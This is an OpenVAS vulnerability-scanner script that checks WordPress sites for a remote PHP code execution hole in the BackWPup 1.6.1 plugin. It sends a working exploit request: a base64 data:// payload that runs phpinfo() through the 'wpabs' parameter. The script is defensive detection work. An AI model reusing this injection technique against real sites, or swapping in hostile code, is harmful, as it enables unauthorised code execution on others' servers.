###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_wordpress_backwpup_plugin_code_exec_vuln.nasl 7044 2017-09-01 11:50:59Z teissa $
#
# WordPress BackWPup Plugin 'wpabs' Parameter Remote PHP Code Execution Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_solution = "Upgrade BackWPup Wordpress plugin to 1.7.1 or later,
  For updates refer to http://wordpress.org/extend/plugins/backwpup/

  NOTE : Exploit will work properly,
  register_globals=On, allow_url_include=On and magic_quotes_gpc=Off";

tag_impact = "Successful exploitation will let remote attackers to execute malicious
  PHP code to in the context of an affected site.
  Impact Level: Application/System";
tag_affected = "BackWPup Wordpress plugin version 1.6.1, Other versions may also be affected.";
tag_insight = "The flaws are caused by improper validation of user-supplied input to the
  'wpabs' parameter in 'wp-content/plugins/backwpup/app/wp_xml_export.php',
  which allows attackers to execute arbitrary PHP code in the context of an
  affected site.";
tag_summary = "This host is installed with WordPress BackWPup Plugin and is prone to remote
  PHP code execution vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.900277";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 7044 $");
  script_tag(name:"last_modification", value:"$Date: 2017-09-01 13:50:59 +0200 (Fri, 01 Sep 2017) $");
  script_tag(name:"creation_date", value:"2011-04-01 15:39:52 +0200 (Fri, 01 Apr 2011)");
  script_tag(name:"cvss_base", value:"9.7");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:C/A:C");
  script_name("WordPress BackWPup Plugin 'wpabs' Parameter Remote PHP Code Execution Vulnerability");

  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17056/");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2011/Mar/328");
  script_xref(name : "URL" , value : "http://www.senseofsecurity.com.au/advisories/SOS-11-003");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "solution" , value : tag_solution);
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");


## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## Path of Vulnerable Page with phpinfo() function in base64 encoded format
path = dir + '/wp-content/plugins/backwpup/app/wp_xml_export.php?_nonce' +
             '=822728c8d9&wpabs=data://text/plain;base64,PD9waHAgcGhwaW' +
             '5mbygpOyA/Pg==';

## Construct and Send attack request
req = http_get(item:path, port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

## Confirm exploit worked by checking the response
if(">phpinfo()<" >< res && ">System <" >< res && ">Configuration<" >< res
   && ">PHP Core<" >< res){
  security_message(port);
}
